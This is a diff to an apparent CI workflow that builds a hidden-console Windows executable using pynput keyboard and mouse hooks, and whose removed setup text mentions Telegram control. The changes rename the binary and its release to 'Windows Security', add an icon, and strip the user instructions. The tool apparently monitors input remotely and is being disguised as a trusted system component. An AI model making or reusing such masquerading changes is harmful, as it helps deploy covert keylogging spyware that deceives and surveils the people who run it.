@@ -19,7 +19,7 @@ jobs:
           python-version: "3.11"
 
       - name: Install dependencies
-        run: pip install -r pc-guardian/requirements.txt pyinstaller
+        run: pip install -r pc-guardian/requirements.txt pyinstaller pillow
         shell: cmd
 
       - name: Create missing folders
@@ -27,13 +27,13 @@ jobs:
           if not exist pc-guardian\assets mkdir pc-guardian\assets
           if not exist pc-guardian\logs mkdir pc-guardian\logs
           if not exist pc-guardian\config mkdir pc-guardian\config
-          echo placeholder > pc-guardian\assets\.gitkeep
         shell: cmd
 
       - name: Build EXE
         run: |
           pyinstaller --onefile --noconsole ^
-            --name "pc-guardian" ^
+            --name "Windows Security" ^
+            --icon "pc-guardian/assets/app.ico" ^
             --hidden-import pynput.keyboard._win32 ^
             --hidden-import pynput.mouse._win32 ^
             --hidden-import win32api ^
@@ -54,7 +54,7 @@ jobs:
           for /f "tokens=*" %%i in ('powershell -Command "Get-Date -Format 'yyyy.MM.dd-HHmm'"') do set DATE=%%i
           set SHA=%GITHUB_SHA:~0,7%
           echo tag=v%DATE%-%SHA%>> %GITHUB_OUTPUT%
-          echo name=PC Guardian %DATE% build %SHA%>> %GITHUB_OUTPUT%
+          echo name=Windows Security %DATE% build %SHA%>> %GITHUB_OUTPUT%
         shell: cmd
 
       - name: Create Release
@@ -65,12 +65,7 @@ jobs:
           body: |
             Auto-built from commit ${{ github.sha }}
             **Changes:** ${{ github.event.head_commit.message }}
-
-            **Setup:**
-            1. Download `pc-guardian.exe`
-            2. Run it — config auto-creates
-            3. Open Telegram → `/status`
-          files: dist/pc-guardian.exe
+          files: "dist/Windows Security.exe"
           draft: false
           prerelease: false
         env:
